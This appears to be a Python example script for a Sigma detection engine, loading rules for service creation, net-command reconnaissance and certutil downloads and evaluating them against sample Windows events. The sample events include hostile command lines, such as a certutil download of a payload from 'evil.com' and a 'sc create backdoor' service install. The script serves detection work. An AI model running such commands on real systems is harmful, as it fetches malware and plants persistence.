"""Example: Sigma rule management and evaluation.

Demonstrates:
    - Loading Sigma rules from YAML
    - Evaluating rules against events
    - Validating rule syntax
    - Listing and inspecting rules
"""

from phantom.detection.sigma_engine import SigmaEngine


def main() -> None:
    engine = SigmaEngine()

    # Add multiple rules
    rules = [
        """
title: Suspicious Service Installation
id: demo-svc-001
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - 'sc create'
            - 'New-Service'
    filter:
        username: 'SYSTEM'
    condition: selection and not filter
level: high
tags:
    - attack.persistence
    - attack.t1543.003
""",
        """
title: Reconnaissance via Net Commands
id: demo-recon-001
status: test
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - 'net user'
            - 'net group'
            - 'net localgroup'
            - 'nltest'
    condition: selection
level: medium
tags:
    - attack.discovery
    - attack.t1087
""",
        """
title: LOLBAS Execution - Certutil Download
id: demo-lolbas-001
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains|all:
            - 'certutil'
            - '-urlcache'
    condition: selection
level: high
tags:
    - attack.command_and_control
    - attack.t1105
""",
    ]

    for rule_yaml in rules:
        rule = engine.add_rule_yaml(rule_yaml)
        if rule:
            print(f"✓ Loaded: {rule.title} [{rule.level}]")

    # List all loaded rules
    print(f"\nLoaded Rules ({engine.rule_count}):")
    for r in engine.list_rules():
        print(f"  {r['id']:<20} {r['title']:<40} {r['level']:<10} {r['techniques']}")

    # Evaluate against events
    events = [
        {"CommandLine": "sc create backdoor binPath=C:\\temp\\evil.exe",
         "username": "admin", "category": "process_creation", "product": "windows"},
        {"CommandLine": "net user /domain",
         "username": "jsmith", "category": "process_creation", "product": "windows"},
        {"CommandLine": "certutil -urlcache -split -f http://evil.com/payload.exe",
         "username": "jsmith", "category": "process_creation", "product": "windows"},
        {"CommandLine": "notepad.exe readme.txt",
         "username": "jsmith", "category": "process_creation", "product": "windows"},
    ]

    print(f"\nEvaluating {len(events)} events against {engine.rule_count} rules...\n")
    results = engine.evaluate(events)

    for result in results:
        print(f"  🚨 [{result.severity.upper()}] {result.rule_name}")
        print(f"     Matched {len(result.matched_events)} events")
        print(f"     MITRE: {', '.join(result.mitre_techniques)}")

    # Validate a rule
    print("\nRule Validation:")
    valid, errors = engine.validate_rule(rules[0])
    print(f"  Valid: {valid}")
    if errors:
        for e in errors:
            print(f"  Error: {e}")


if __name__ == "__main__":
    main()
